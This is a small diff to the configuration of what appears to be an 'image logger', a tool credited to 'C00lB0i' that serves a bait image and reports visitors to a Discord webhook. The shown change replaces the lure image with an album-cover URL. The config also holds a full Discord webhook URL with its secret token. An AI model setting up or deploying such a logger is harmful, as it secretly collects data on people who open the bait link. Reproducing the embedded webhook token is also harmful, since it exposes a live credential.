@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1402051186659557436/dSo0NP5ZKEWmxjav5yff_cLJ3TE1NMeg92nM8I30LsM_qh0Vkei0P71aYTD3_lNxXUkd",
-    "image": "https://i.makeagif.com/media/1-31-2025/h-CSoD.gif", # You can also have a custom image by using a URL argument
+    "image": "https://is1-ssl.mzstatic.com/image/thumb/Music211/v4/bd/25/c7/bd25c740-508c-e637-4172-ec493cc4b4a3/5063535240735_cover.jpg/1200x630bb.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
